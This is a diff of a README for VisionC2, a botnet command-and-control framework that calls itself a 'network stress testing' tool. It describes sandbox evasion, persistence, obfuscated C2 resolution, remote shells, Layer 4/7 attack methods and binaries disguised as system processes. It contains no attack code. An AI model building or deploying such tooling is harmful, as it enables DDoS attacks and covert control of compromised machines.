@@ -1,12 +1,30 @@
 # VisionC2 – Advanced Botnet Command & Control Framework
-
+> **VisionC2** is a Go-based C2 framework for **network stress testing**. Features a full-screen TUI, TLS 1.3 + HMAC auth + sandbox evasion, remote shell, SOCKS5 proxy, and advanced Layer 4/7 attack methods.
+---
 ![VisionC2](https://img.shields.io/badge/VisionC2-V1.7-red)
 ![Go](https://img.shields.io/badge/Go-1.23.0+-blue)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
 ![License](https://img.shields.io/badge/License-GNU-yellow)
 
+```
+  ____   ____.__       .__              _________  ________  
+  \   \ /   /|__| _____|__| ____   ____ \_   ___ \ \_____  \ 
+   \   Y   / |  |/  ___/  |/  _ \ /    \/    \  \/  /  ____/ 
+    \     /  |  |\___ \|  (  <_> )   |  \     \____/       \ 
+     \___/   |__/____  >__|\____/|___|  /\______  /\_______ \
+                     \/               \/        \/         \/
+Bots: 47  │  Attacks: 20  │  Uptime: 3h 25m │ Cores: 128 │ Ram: 82640MB                    
 
-**VisionC2** is a Go-based C2 framework for **network stress testing**. Features a full-screen TUI, TLS 1.3 + HMAC auth + sandbox evasion, remote shell, SOCKS5 proxy, and advanced Layer 4/7 attack methods.
+
+  ▸ 🤖 BOT MANAGEMENT
+    ⚡ ATTACK CENTER
+    📊 BROADCAST SHELL
+    🧦 SOCKS MANAGER
+    📜 HELP & INFO
+    ❓ EXIT
+
+  [↑/↓] Navigate  [enter] Select  [q] Quit
+```
 
 ---
 
@@ -38,28 +56,6 @@
 * Fully automated ~5-minute setup
 
 > *Performance depends on agent hardware and network conditions.*
-
----
-## 🧠 Architecture Overview
-
-```
-[ Admin ] → [ C2 Server/TUI ] ↔ [ Bot Agents ]
-                    │              │
-            TLS 1.3 │              ├─ Persistence (cron/rc.local)
-            HMAC Auth │            ├─ Multi-layer C2 Resolution
-                    │              ├─ Sandbox Detection
-                    │              └─ Encrypted Command Loop
-                    │
-                    └─ Issues HMAC challenge
-                       Verifies response
-                       Queues commands
-```
-
-**Bot Authentication Flow:**
-1. **C2 Decryption + C2 Resolution** – Base64 → XOR → RC4 → Byte Sub → MD5 → DoH TXT/DNS A
-2. **HMAC Auth** – TLS handshake → Challenge → Response (MD5(ch+MAGIC+ch)) → AUTH_SUCCESS
-3. **Runtime** – Encrypted command loop, attacks, shell, SOCKS5, reconnect on drop
----
 
 ## 🧪 Demo
 
@@ -128,6 +124,27 @@ Binaries are named to resemble system processes for operational blending:
 
 See `bot/build.sh` or `USAGE.md` for full mapping.
 
+---
+---
+## 🧠 Architecture Overview
+
+```
+[ Admin ] → [ C2 Server/TUI ] ↔ [ Bot Agents ]
+                    │              │
+            TLS 1.3 │              ├─ Persistence (cron/rc.local)
+            HMAC Auth │            ├─ Multi-layer C2 Resolution
+                    │              ├─ Sandbox Detection
+                    │              └─ Encrypted Command Loop
+                    │
+                    └─ Issues HMAC challenge
+                       Verifies response
+                       Queues commands
+```
+
+**Bot Authentication Flow:**
+1. **C2 Decryption + C2 Resolution** – Base64 → XOR → RC4 → Byte Sub → MD5 → DoH TXT/DNS A
+2. **HMAC Auth** – TLS handshake → Challenge → Response (MD5(ch+MAGIC+ch)) → AUTH_SUCCESS
+3. **Runtime** – Encrypted command loop, attacks, shell, SOCKS5, reconnect on drop
 ---
 
 ## 🗺️ Roadmap
